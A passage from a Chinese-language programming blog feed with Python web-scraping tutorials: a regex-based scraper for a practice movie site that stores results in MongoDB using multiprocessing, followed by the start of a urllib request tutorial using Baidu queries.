<span class="hljs-comment">#如果发生异常就报错  </span><br>        <span class="hljs-comment"># exc_info=True用于日志记录异常信息时，会将异常类型 值 回溯信息 堆栈跟踪等都返回</span><br>        logging.error(<span class="hljs-string">&quot;爬取%s发生异常&quot;</span> % url,exc_info=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#解析内容，提取出列表页所有电影的详情页面的url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_index</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则提取详情页面的链接</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;a.*href=&quot;(.*?)&quot;.*?class=&quot;name&quot;&gt;&#x27;</span>)<br>    items = re.findall(pattern,html)<br>    <span class="hljs-comment">#print(items)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> items:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-comment">#把相对链接转为绝对链接</span><br>        detail_url = urljoin(BASE_URL,item)<br>        <span class="hljs-comment">#print(detail_url)</span><br>        logging.info(<span class="hljs-string">&quot;找到详情页，链接%s&quot;</span>%detail_url)<br>        <span class="hljs-comment">#返回一个生成器 可以使用for循环或者调用next()方法遍历生成器对象来提取结果</span><br>        <span class="hljs-keyword">yield</span> detail_url    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_detail</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">return</span> parse_detail(scrape_page(url))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_detail</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则表达式将详情页相应的内容匹配下来</span><br>    <span class="hljs-comment">#图片url 正则</span><br>    img_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;class=&quot;el-col.*?&lt;img.*?src=&quot;(.*?)&quot;.*?class=&quot;cover&quot;&gt;&#x27;</span>,re.S)<br>    img_url = re.search(img_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(img_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#img_url[0]</span><br><br>    <span class="hljs-comment">#类别 正则</span><br>    <span class="hljs-comment">#注意这里要加上re.S  .任意匹配  包括换行符</span><br>    <span class="hljs-comment">#因为.是匹配除了换行符之外的任意字符</span><br>    categories_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;button.*?category.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;/button&gt;&#x27;</span>,re.S)<br>    categories = re.findall(categories_pattern,html) <span class="hljs-keyword">if</span> re.findall(categories_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment">#上映时间 正则</span><br>    date_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)\s?上映&#x27;</span>)<br>    date = re.search(date_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(date_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#date[0]</span><br><br>    <span class="hljs-comment">#评分 正则</span><br>    score_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;p.*?score.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    score = re.search(score_pattern,html).group(<span class="hljs-number">1</span>).split() <span class="hljs-keyword">if</span> re.search(score_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#score[0]  返回的列表</span><br><br>    <span class="hljs-comment">#剧情简介 正则</span><br>    drama_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div.*?drama.*?&gt;.*?&lt;p.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    drama = re.search(drama_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(drama_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#drama[0]</span><br><br>    <span class="hljs-comment">#名称 正则</span><br>    name_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;h2.*?m-b-sm.*?&gt;(.*?)&lt;/h2&gt;&#x27;</span>,re.S)<br>    name = re.search(name_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(name_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span> <br>    <span class="hljs-comment">#name</span><br>    <br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-comment"># &#x27;image&#x27;:img_url[0],</span><br>        <span class="hljs-comment"># &#x27;categories&#x27;:categories,</span><br>        <span class="hljs-comment"># &#x27;date&#x27;:date[0],</span><br>        <span class="hljs-comment"># &#x27;score&#x27;:score[0],</span><br>        <span class="hljs-comment"># &#x27;drama&#x27;:drama,</span><br>        <span class="hljs-comment"># &#x27;name&#x27;:name</span><br>        <span class="hljs-string">&#x27;image&#x27;</span>:img_url,<br>        <span class="hljs-string">&#x27;categories&#x27;</span>:categories,<br>        <span class="hljs-string">&#x27;date&#x27;</span>:date,<br>        <span class="hljs-string">&#x27;score&#x27;</span>:score[<span class="hljs-number">0</span>],<br>        <span class="hljs-string">&#x27;drama&#x27;</span>:drama,<br>        <span class="hljs-string">&#x27;name&#x27;</span>:name<br>    &#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment">#获取所有电影详情页的链接</span><br>    <span class="hljs-comment"># for page in range(1,TOTAL_PAGE+1):</span><br>    <span class="hljs-comment">#     #抓取某个页面的内容 返回html源码</span><br>    <span class="hljs-comment">#     index_html = scrape_index(page)</span><br>    <span class="hljs-comment">#     #根据源码抓取该页面上跳转详情页的链接</span><br>    <span class="hljs-comment">#     details_urls = parse_index(index_html)</span><br>    <span class="hljs-comment">#     #print(list(details_urls))</span><br>    <span class="hljs-comment">#     logging.info(&quot;详情页面链接%s&quot;,list(details_urls))</span><br><br>    <span class="hljs-comment">#详情页信息爬取测试--第一页</span><br>    <span class="hljs-comment">#获取到第一页的源码</span><br>    index_html = scrape_index(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment">#获取第一页所有电影的详情页的url</span><br>    detail_urls = parse_index(index_html)<br>    <span class="hljs-comment">#爬取每个详情页的信息</span><br>    <span class="hljs-keyword">for</span> detail_url <span class="hljs-keyword">in</span> detail_urls:<br>        data = scrape_detail(detail_url)<br>        logging.info(<span class="hljs-string">&quot;get detail data %s&quot;</span> % data)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p><img src="/img/image-20230930190440051.png" alt="image-20230930190440051"></p><h3 id="第三步-存入数据库（mongodb）-多线程"><a href="#第三步-存入数据库（mongodb）-多线程" class="headerlink" title="第三步 存入数据库（mongodb）+多线程"></a>第三步 存入数据库（mongodb）+多线程</h3><p>centos7安装mongodb3.6以上</p><p><a href="https://www.cnblogs.com/lone5wolf/p/10855985.html">CentOS7下安装配置Mongodb3.6 - #独狼 - 博客园 (cnblogs.com)</a></p><p><a href="https://blog.csdn.net/zhao_5352269/article/details/82151173">Cenos7 yum安装mongodb以及各种错误的解决办法-CSDN博客</a></p><p><a href="https://zhuanlan.zhihu.com/p/449833439">Linux Centos 7安装MongoDB（简单！详细！） - 知乎 (zhihu.com)</a></p><p><img src="/img/image-20230930201309769.png" alt="image-20230930201309769"></p><p>下载mongodb compass（gui工具）  Documents显示有问题（版本原因）</p><p><a href="https://www.mongodb.com/try/download/compass">MongoDB Compass Download (GUI) | MongoDB</a></p><h4 id="存入mongodb"><a href="#存入mongodb" class="headerlink" title="存入mongodb"></a>存入mongodb</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#创建mongodb客户端</span><br>mongo_client = pymongo.MongoClient(<span class="hljs-string">&quot;mongodb://10.210.100.131:27017/&quot;</span>)<br><span class="hljs-comment">#创建数据库</span><br>db = mongo_client[<span class="hljs-string">&#x27;r1_movies&#x27;</span>]<br>collection = db[<span class="hljs-string">&#x27;movies&#x27;</span>]<br><br><span class="hljs-comment">#保存数据到mongodb 使用时调用此函数即可</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_data</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment">#插入数据</span><br>    collection.insert_one(data)<br>    logging.info(<span class="hljs-string">&quot;数据保存到mongodb成功！！！&quot;</span>)<br></code></pre></td></tr></table></figure><img src="/img/image-20230930201234040.png" alt="image-20230930201234040" style="zoom:67%;" /><p><img src="/img/image-20230930201813980.png" alt="image-20230930201813980"></p><h4 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment">#coding:utf-8</span><br><br><span class="hljs-keyword">import</span> logging<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urljoin<br><span class="hljs-keyword">import</span> pymongo<br><span class="hljs-keyword">import</span> multiprocessing<br><br><span class="hljs-comment">#创建mongodb客户端</span><br>mongo_client = pymongo.MongoClient(<span class="hljs-string">&quot;mongodb://10.210.100.131:27017/&quot;</span>)<br><span class="hljs-comment">#创建数据库</span><br>db = mongo_client[<span class="hljs-string">&#x27;r1_movies&#x27;</span>]<br>collection = db[<span class="hljs-string">&#x27;movies&#x27;</span>]<br><br><span class="hljs-comment">#1.配置日志</span><br>logging.basicConfig(level=logging.INFO,<br>                    <span class="hljs-built_in">format</span>=<span class="hljs-string">&#x27;%(asctime)s - %(levelname)s - %(message)s&#x27;</span>)<br><br><br>BASE_URL = <span class="hljs-string">&quot;https://ssr1.scrape.center&quot;</span><br>TOTAL_PAGE = <span class="hljs-number">10</span><br><br><span class="hljs-comment">#2.抓取某一列表页面的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_index</span>(<span class="hljs-params">page</span>):<br>    index_url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;BASE_URL&#125;</span>/page/<span class="hljs-subst">&#123;page&#125;</span>&#x27;</span><br>    <span class="hljs-keyword">return</span> scrape_page(index_url)<br><br><span class="hljs-comment">#定义函数抓取网页的内容 返回html源码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_page</span>(<span class="hljs-params">url</span>):<br>    logging.info(<span class="hljs-string">&quot;正在抓取 %s......&quot;</span>,url)<br>    <span class="hljs-comment">#发起get请求</span><br>    <span class="hljs-keyword">try</span>:<br>        response = requests.get(url)<br>        <span class="hljs-keyword">if</span> response.status_code == <span class="hljs-number">200</span>:<br>            <span class="hljs-keyword">return</span> response.text<br>        <span class="hljs-keyword">else</span>:<br>            logging.error(<span class="hljs-string">&quot;爬取%s时返回无效的状态码%s&quot;</span> % (url,response.status_code))<br>    <span class="hljs-keyword">except</span> requests.RequestException:<br>        <span class="hljs-comment">#如果发生异常就报错  </span><br>        <span class="hljs-comment"># exc_info=True用于日志记录异常信息时，会将异常类型 值 回溯信息 堆栈跟踪等都返回</span><br>        logging.error(<span class="hljs-string">&quot;爬取%s发生异常&quot;</span> % url,exc_info=<span class="hljs-literal">True</span>)<br><br><span class="hljs-comment">#解析内容，提取出列表页所有电影的详情页面的url</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_index</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则提取详情页面的链接</span><br>    pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;a.*href=&quot;(.*?)&quot;.*?class=&quot;name&quot;&gt;&#x27;</span>)<br>    items = re.findall(pattern,html)<br>    <span class="hljs-comment">#print(items)</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> items:<br>        <span class="hljs-keyword">return</span> []<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> items:<br>        <span class="hljs-comment">#把相对链接转为绝对链接</span><br>        detail_url = urljoin(BASE_URL,item)<br>        <span class="hljs-comment">#print(detail_url)</span><br>        logging.info(<span class="hljs-string">&quot;找到详情页，链接%s&quot;</span>%detail_url)<br>        <span class="hljs-comment">#返回一个生成器 可以使用for循环或者调用next()方法遍历生成器对象来提取结果</span><br>        <span class="hljs-keyword">yield</span> detail_url    <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">scrape_detail</span>(<span class="hljs-params">url</span>):<br>    <span class="hljs-keyword">return</span> parse_detail(scrape_page(url))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_detail</span>(<span class="hljs-params">html</span>):<br>    <span class="hljs-comment">#使用正则表达式将详情页相应的内容匹配下来</span><br>    <span class="hljs-comment">#图片url 正则</span><br>    img_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;class=&quot;el-col.*?&lt;img.*?src=&quot;(.*?)&quot;.*?class=&quot;cover&quot;&gt;&#x27;</span>,re.S)<br>    img_url = re.search(img_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(img_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#img_url[0]</span><br><br>    <span class="hljs-comment">#类别 正则</span><br>    <span class="hljs-comment">#注意这里要加上re.S  .任意匹配  包括换行符</span><br>    <span class="hljs-comment">#因为.是匹配除了换行符之外的任意字符</span><br>    categories_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;button.*?category.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;/button&gt;&#x27;</span>,re.S)<br>    categories = re.findall(categories_pattern,html) <span class="hljs-keyword">if</span> re.findall(categories_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-comment">#上映时间 正则</span><br>    date_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;(\d&#123;4&#125;-\d&#123;2&#125;-\d&#123;2&#125;)\s?上映&#x27;</span>)<br>    date = re.search(date_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(date_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#date[0]</span><br><br>    <span class="hljs-comment">#评分 正则</span><br>    score_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;p.*?score.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    score = re.search(score_pattern,html).group(<span class="hljs-number">1</span>).split() <span class="hljs-keyword">if</span> re.search(score_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#score[0]  返回的列表</span><br><br>    <span class="hljs-comment">#剧情简介 正则</span><br>    drama_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;div.*?drama.*?&gt;.*?&lt;p.*?&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<br>    drama = re.search(drama_pattern,html).group(<span class="hljs-number">1</span>).strip() <span class="hljs-keyword">if</span> re.search(drama_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span><br>    <span class="hljs-comment">#drama[0]</span><br><br>    <span class="hljs-comment">#名称 正则</span><br>    name_pattern = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;&lt;h2.*?m-b-sm.*?&gt;(.*?)&lt;/h2&gt;&#x27;</span>,re.S)<br>    name = re.search(name_pattern,html).group(<span class="hljs-number">1</span>) <span class="hljs-keyword">if</span> re.search(name_pattern,html) <span class="hljs-keyword">else</span> <span class="hljs-literal">None</span> <br>    <span class="hljs-comment">#name</span><br>    <br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-comment"># &#x27;image&#x27;:img_url[0],</span><br>        <span class="hljs-comment"># &#x27;categories&#x27;:categories,</span><br>        <span class="hljs-comment"># &#x27;date&#x27;:date[0],</span><br>        <span class="hljs-comment"># &#x27;score&#x27;:score[0],</span><br>        <span class="hljs-comment"># &#x27;drama&#x27;:drama,</span><br>        <span class="hljs-comment"># &#x27;name&#x27;:name</span><br>        <span class="hljs-string">&#x27;image&#x27;</span>:img_url,<br>        <span class="hljs-string">&#x27;categories&#x27;</span>:categories,<br>        <span class="hljs-string">&#x27;date&#x27;</span>:date,<br>        <span class="hljs-string">&#x27;score&#x27;</span>:score[<span class="hljs-number">0</span>],<br>        <span class="hljs-string">&#x27;drama&#x27;</span>:drama,<br>        <span class="hljs-string">&#x27;name&#x27;</span>:name<br>    &#125;<br><br><span class="hljs-comment">#保存数据到mongodb</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_data</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-comment">#插入数据</span><br>    collection.insert_one(data)<br>    logging.info(<span class="hljs-string">&quot;数据保存到mongodb成功！！！&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>(<span class="hljs-params">page</span>):<br>    <span class="hljs-comment">#获取所有电影详情页的链接</span><br>    <span class="hljs-comment"># for page in range(1,TOTAL_PAGE+1):</span><br>    <span class="hljs-comment">#     #抓取某个页面的内容 返回html源码</span><br>    <span class="hljs-comment">#     index_html = scrape_index(page)</span><br>    <span class="hljs-comment">#     #根据源码抓取该页面上跳转详情页的链接</span><br>    <span class="hljs-comment">#     details_urls = parse_index(index_html)</span><br>    <span class="hljs-comment">#     #print(list(details_urls))</span><br>    <span class="hljs-comment">#     logging.info(&quot;详情页面链接%s&quot;,list(details_urls))</span><br><br>    <span class="hljs-comment">#加入多线程后舍弃</span><br>    <span class="hljs-comment"># for page in range(1,TOTAL_PAGE+1):</span><br>    <span class="hljs-comment">#     #详情页信息爬取测试--第一页</span><br>    <span class="hljs-comment">#     #获取到第一页的源码</span><br>    <span class="hljs-comment">#     index_html = scrape_index(page)</span><br>    <span class="hljs-comment">#     #获取第一页所有电影的详情页的url</span><br>    <span class="hljs-comment">#     detail_urls = parse_index(index_html)</span><br>    <span class="hljs-comment">#     #爬取每个详情页的信息</span><br>    <span class="hljs-comment">#     for detail_url in detail_urls:</span><br>    <span class="hljs-comment">#         data = scrape_detail(detail_url)</span><br>    <span class="hljs-comment">#         #logging.info(&quot;get detail data %s&quot; % data)</span><br>    <span class="hljs-comment">#         save_data(data=data)</span><br>    <span class="hljs-comment">#         logging.info(&quot;data save successfully!!!&quot;)</span><br><br>    <br>    <span class="hljs-comment">#详情页信息爬取测试--第一页</span><br>    <span class="hljs-comment">#获取到第一页的源码</span><br>    index_html = scrape_index(page)<br>    <span class="hljs-comment">#获取第一页所有电影的详情页的url</span><br>    detail_urls = parse_index(index_html)<br>    <span class="hljs-comment">#爬取每个详情页的信息</span><br>    <span class="hljs-keyword">for</span> detail_url <span class="hljs-keyword">in</span> detail_urls:<br>        data = scrape_detail(detail_url)<br>        <span class="hljs-comment">#logging.info(&quot;get detail data %s&quot; % data)</span><br>        save_data(data=data)<br>        logging.info(<span class="hljs-string">&quot;data save successfully!!!&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_main</span>(<span class="hljs-params">page</span>):<br>    main(page)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#获取CPU核心数量</span><br>    num_process = multiprocessing.cpu_count()<br>    <span class="hljs-comment">#根据cpu核心数量创建线程池</span><br>    pool = multiprocessing.Pool(num_process)<br>    <span class="hljs-comment">#要爬取页面的数量</span><br>    page_to_scrape = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,TOTAL_PAGE+<span class="hljs-number">1</span>))<br>    <span class="hljs-comment">#使用进程池运行</span><br>    pool.<span class="hljs-built_in">map</span>(run_main,page_to_scrape)<br>    <span class="hljs-comment">#关闭进程池</span><br>    pool.close()<br>    <span class="hljs-comment">#main()</span><br></code></pre></td></tr></table></figure><img src="/img/image-20230930204730425.png" alt="image-20230930204730425" style="zoom: 50%;" /><img src="/img/image-20230930204640239.png" alt="image-20230930204640239" style="zoom: 50%;" />]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>爬虫学习</title>
    <link href="/2023/10/07/%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/10/07/%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="爬虫学习"><a href="#爬虫学习" class="headerlink" title="爬虫学习"></a>爬虫学习</h1><h2 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h2><p>python内置的http请求库</p><p>4大模块：</p><p>1.request模块：最基本的http请求模块</p><p>2.error模块：异常处理模块</p><p>3.parse模块：工具模块，提供url的处理方法</p><p>4.robotparser模块：识别robot.txt</p><h3 id="request"><a href="#request" class="headerlink" title="request"></a>request</h3><h4 id="第一个爬虫"><a href="#第一个爬虫" class="headerlink" title="第一个爬虫"></a>第一个爬虫</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><br><span class="hljs-comment">#发送一个最基本的请求</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_baidu_data</span>():<br>    url = <span class="hljs-string">&#x27;http://www.baidu.com/&#x27;</span><br>    response = urllib.request.urlopen(url)<br>    <span class="hljs-comment">#print(response.code)</span><br>    data = response.read()<br>    <span class="hljs-comment">#将data获取到的东西转换为字符串</span><br>    str_data = data.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-comment">#print(str_data)</span><br>    <span class="hljs-comment">#将数据写入文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;baidu.html&#x27;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(str_data)<br><br>load_baidu_data()<br></code></pre></td></tr></table></figure><h4 id="get请求"><a href="#get请求" class="headerlink" title="get请求"></a>get请求</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#发送get型请求  单个参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_baidu_data</span>():<br>    url = <span class="hljs-string">&#x27;https://www.baidu.com/s?wd=&#x27;</span><br>    <span class="hljs-comment">#url+search</span><br>    name = <span class="hljs-string">&quot;卢本伟&quot;</span><br>    final_url = url+name<br>    <span class="hljs-comment">#网址里包含了中文 需要进行转码</span><br>    encode_url = urllib.parse.quote(final_url,safe=string.printable)<br>    <span class="hljs-built_in">print</span>(encode_url)<br><br>    response = urllib.request.urlopen(encode_url)<br>    <span class="hljs-built_in">print</span>(response.code)<br><br>load_baidu_data()<br><br><br><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-comment">#发送get型请求  多个参数</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_baidu_data</span>():<br>    url = <span class="hljs-string">&#x27;https://www.baidu.com/s?&#x27;</span><br>    <span class="hljs-comment">#使用params字典</span><br>    params = &#123;<br>        <span class="hljs-string">&quot;wd&quot;</span>:<span class="hljs-string">&quot;孙悟空&quot;</span>,<br>        <span 